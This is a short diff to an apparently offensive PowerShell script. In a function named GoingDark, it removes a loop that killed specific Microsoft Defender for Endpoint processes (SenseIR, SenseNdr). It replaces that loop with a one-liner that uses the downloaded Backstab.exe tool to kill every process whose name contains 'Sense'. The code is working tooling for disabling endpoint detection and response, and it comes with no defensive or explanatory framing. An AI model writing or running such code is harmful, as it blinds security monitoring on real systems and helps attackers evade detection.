@@ -30,16 +30,8 @@ function GoingDark() {
     Write-Host "[i] Running backstab"
     & $downloadDirectory\Backstab.exe
 
-    $defenderProcesses = @("SenseIR", "SenseNdr")
-    foreach ($process in $defenderProcesses) {
-        if ($(Get-Service $process).Status -ne "Running") {
-            Write-Host "[i] Killing $process"
-            & $downloadDirectory\Backstab.exe -n $($process + ".exe") -k
-        } else {
-            Write-Host "[i] $process is not running"
-        }
-    }
-
+    # killing all sense processes
+    Get-Process | Where-Object {$_.ProcessName -like "*Sense*"} | ForEach-Object {& $downloadDirectory\Backstab.exe -n $_.Id -k}
 }
 
 function BravoSix() {
